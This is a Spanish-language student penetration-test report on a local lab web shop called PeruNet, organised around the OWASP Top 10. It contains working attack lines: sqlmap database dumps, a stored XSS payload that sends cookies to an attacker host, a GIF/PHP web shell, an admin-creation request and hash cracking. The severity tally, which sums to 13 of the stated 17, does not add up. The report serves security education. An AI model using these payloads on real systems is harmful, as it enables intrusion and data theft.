# PROYECTO FINAL - TALLER DE SEGURIDAD INFORMATICA

## PeruNet (NewTec) - Analisis y Evaluacion de Vulnerabilidades Web

---

| Curso | Taller de Seguridad Informatica |
| Ciclo | IX |
| Institucion | Facultad de Ingenieria, Arquitectura y Urbanismo |
| Atributo del Graduado | AG-C01 - Aprendizaje a lo largo de la vida |
| Aplicacion | PeruNet - Tienda de seguridad informatica |
| URL base | http://192.168.100.12/perunet |
| Servidor | XAMPP (Apache/2.4.58 + PHP/8.2.12 + MySQL) |
| BD | tienda_online |
| SO Atacante | Kali Linux |
| Metodologia | OWASP Top 10 2021 |

---

## 1. Resumen Ejecutivo

Analisis de seguridad a la aplicacion web PeruNet aplicando OWASP Top 10 2021 desde Kali Linux contra servidor XAMPP local.

Se identificaron 17 vulnerabilidades: 6 criticas, 3 altas, 4 medias.

> img

## 2. Introduccion

La seguridad informatica es un pilar fundamental en el desarrollo de aplicaciones web modernas. PeruNet, siendo una tienda especializada en seguridad informatica, debe predicar con el ejemplo.

> img

## 3. Marco Legal y Normatividad

Leyes: N 29733 (Datos Personales), N 30096 (Delitos Informaticos), DL 1412 (Gobierno Digital).
Estandares: OWASP Top 10, ISO 27001, ISO 27032, NIST SP 800-115.

> img

## 4. Objetivos y Alcance

OG: Realizar un analisis integral de seguridad a PeruNet aplicando OWASP Top 10 2021.
OE: Identificar vectores de ataque, explotar SQLi, XSS, RCE, evaluar controles de acceso.
Alcance: App web completa, BD MySQL, configuracion del servidor.

## 5. Metodologia

Fases: Reconocimiento (Nmap, Gobuster, Nikto), Identificacion (sqlmap, Burp), Explotacion, Post-explotacion, Documentacion.

> img

## 6. Desarrollo - Fase de Reconocimiento

### 6.1 Escaneo de Puertos
nmap -sV -p 80,3306 192.168.100.12
Puertos: 80/tcp (Apache 2.4.58), 3306/tcp (MySQL)
> img

### 6.2 Enumeracion de Directorios
gobuster dir -u http://192.168.100.12/perunet -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,zip,sql,txt
Directorios: /admin, /login, /registro, /contacto, /productos, /phpinfo, /.git/HEAD, /app/
> img

### 6.3 Analisis con Nikto
nikto -h http://192.168.100.12/perunet
Hallazgos: Cookie sin HttpOnly, HTTP TRACE activo, .git/index expuesto, Headers faltantes
> img

## 7. Desarrollo - Vulnerabilidades Encontradas

### 7.1 SQL Injection - Login (A03:2021)
Endpoint: POST /login | Archivo: UsuarioModel.php:58-60 | Parametro: email
sqlmap -r inter.txt -D tienda_online --dump-all --batch
> img

### 7.2 SQL Injection - Productos (A03:2021)
Endpoint: GET /productos?busqueda=x&ordenar= | Archivo: ProductoModel.php:378-388 | Parametro: ordenar
sqlmap -u http://192.168.100.12/perunet/productos?busqueda=x&ordenar=1 --dbs --batch
> img

### 7.3 SQL Injection - API Usuario (A03:2021)
Endpoint: GET /usuario/api/:id | Archivo: UsuarioController.php:40 | Parametro: id
curl http://192.168.100.12/perunet/usuario/api/1 UNION SELECT 1,contrasena,3,4,5,6,7,8 FROM usuario
> img

### 7.4 SQL Injection - Cupones (A03:2021)
Endpoint: GET /carrito/cupon?codigo= | Archivo: CarritoController.php:21 | Parametro: codigo

### 7.5 SQL Injection - Contacto (A03:2021)
Endpoint: POST /contacto | Archivo: ContactoController.php:20 | Parametros: nombre,telefono,correo,mensaje
sqlmap -u http://192.168.100.12/perunet/contacto --data=nombre=test&telefono=999&correo=test@test.com&mensaje=test --dbs --batch
> img

### 7.6 XSS Almacenado (A03:2021)
POST /contacto -> /admin/contacto/mensajes | ContactoController.php | Sin htmlspecialchars()
Payload: <script>document.location='http://KALI:9090/?c='+document.cookie</script>
> img

### 7.7 Subida de Archivos Maliciosos (Polyglot)
POST /admin/productos/guardar | ProductosController.php:149 | getimagesize() burlable
echo 'GIF89a<?php system([chr(99).chr(109).chr(100)]); ?>' > shell.gif
curl http://192.168.100.12/perunet/public/img/uploads/shell.gif?cmd=whoami
> img

### 7.8 Mass Assignment (A01:2021)
POST /registro | AuthController.php:67 | id_rol=1 sin validacion
curl -X POST http://192.168.100.12/perunet/registro -d nombre=adminhack&correo=adminhack@test.com&password=Hack12345&id_rol=1
> img

### 7.9 IDOR (A01:2021)
GET /usuarios/compra/:id | VentaModel.php:116-125 | Filtro por usuario se omite cuando es null

### 7.10 Hash MD5 Debil (A02:2021)
API /usuario/api/:id expone contrasena en MD5
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
> img

### 7.11 Session Hijacking (A07:2021)
App.php:42 | httponly=false | XSS + cookie sin HttpOnly = control total del admin

### 7.12 Repositorio .git Expuesto (A05:2021)
Archivos: /.git/HEAD, /.git/index, app/config/query.sql
> img

### 7.13 phpinfo() Expuesto (A05:2021)
curl http://192.168.100.12/perunet/phpinfo

### 7.14 Open Redirect (A01:2021)
GET /redirect?url= | IndexController.php:46-50

### 7.15 Headers de Seguridad Faltantes
Ausentes: CSP, HSTS, Permissions-Policy, Referrer-Policy, X-Content-Type-Options

## 8. Desarrollo - Explotacion y Resultados

### 8.1 Extraccion de la Base de Datos
sqlmap -r inter.txt -D tienda_online --dump-all --batch
Tablas: usuario (9 reg), producto (18 reg), venta, cupon
> img

### 8.2 Robo de Sesion del Administrador
curl --cookie perunet_session=COOKIE_ROBADA http://192.168.100.12/perunet/admin
> img

### 8.3 Creacion de Admin No Autorizado
curl -X POST http://192.168.100.12/perunet/registro -d nombre=hacker&correo=hacker@hack.com&password=Hack123&id_rol=1
> img

### 8.4 Resumen de Resultados
17 vulnerabilidades: 6 criticas, 3 altas, 4 medias
> img

## 9. Analisis de Riesgos
SQLi/XSS: Critico | FileUpload/MassAssignment/MD5: Alto | IDOR/git: Medio | phpinfo/Redirect: Bajo
> img

## 10. Analisis de Resultados e Impacto
Se demostraron 3 formas de obtener acceso admin, BD completa extraida, RCE obtenida.
> img

## 11. Conclusiones y Recomendaciones
1. PeruNet presenta 17 vulnerabilidades graves
2. Mayor riesgo: 5 SQLi que exponen la BD completa
3. XSS + HttpOnly=false = robo de sesion del admin
4. Subida de archivos = RCE en el servidor
5. MD5 inadecuado, usar bcrypt
6. .git expuesto facilita el reconocimiento
> img

Recomendaciones: prepared statements, bcrypt, httponly=true, validar uploads, htmlspecialchars, eliminar .git, headers de seguridad, 2FA.

## 12. Guia de Explotacion Rapida
sqlmap -r inter.txt -D tienda_online --dump-all --batch
sqlmap -u http://192.168.100.12/perunet/productos?busqueda=x&ordenar=1 --dbs --batch
sqlmap -u http://192.168.100.12/perunet/usuario/api/1 --dump -T usuario --batch
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
curl -X POST http://192.168.100.12/perunet/registro -d nombre=adminhack&correo=adminhack@test.com&password=Hack12345&id_rol=1

---

AG-C01-C1 (Salud): Riesgos de datos personales (Ley 29733)
AG-C01-C2 (Seguridad): 17 vulnerabilidades evaluadas
AG-C01-C3 (Legal): Leyes nacionales documentadas
AG-C01-C4 (Cultural): Cultura de seguridad (DevSecOps)

Disclaimer: Proyecto educativo en entorno local controlado.
